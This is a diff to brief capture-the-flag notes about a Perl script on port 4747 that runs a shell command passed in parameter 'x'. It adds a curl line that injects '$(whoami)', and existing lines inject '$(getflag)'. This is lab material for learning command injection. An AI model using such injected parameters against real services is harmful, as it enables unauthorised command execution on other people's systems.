@@ -1,5 +1,9 @@
 there is a perl script running on port 4747, which prints a parameter 'x'
 this allows execution of a command passed as a parameter
+
+curl localhost:4747?x='$(whoami)'
+returns "flag04" which means the requests to this server are made from flag04 user.
+
 if getflag gets evaluated from the script, which runs as user flag04,
 
 	curl localhost:4747?x='$(getflag)'
